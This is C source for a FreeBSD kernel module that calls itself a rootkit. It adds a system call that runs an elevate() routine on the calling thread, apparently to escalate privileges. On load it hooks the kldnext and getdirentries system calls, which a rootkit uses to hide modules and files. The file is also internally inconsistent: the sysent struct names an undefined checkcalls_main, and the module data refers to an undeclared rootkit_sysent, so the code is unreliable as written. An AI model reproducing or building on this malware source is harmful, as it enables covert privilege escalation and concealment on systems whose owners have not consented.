#include <sys/kernel.h>
#include <sys/linker.h>
#include <sys/module.h>
#include <sys/param.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/types.h>

#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/resourcevar.h>
#include <sys/sx.h>

#include "rootkit.h"

/* The system call's arguments. */
struct rootkit_args {
};

/* The system call function. */
static int rootkit_func(struct thread *td, void *syscall_args) {
	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	elevate(td);

	return(0);
}

/* The sysent for the new system call. */
static struct sysent checkcalls_sysent = {
	3,			/* number of arguments */
	checkcalls_main		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		printf("system call loaded at offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
		printf("kldnext hooked\n");
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;
		printf("getdirentries hooked\n");



		break;

	case MOD_UNLOAD:
		printf("system call unloaded from offset %d.\n", offset);
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
		printf("kldnext unhooked\n");
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
		printf("getdirentries unhooked\n");
		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
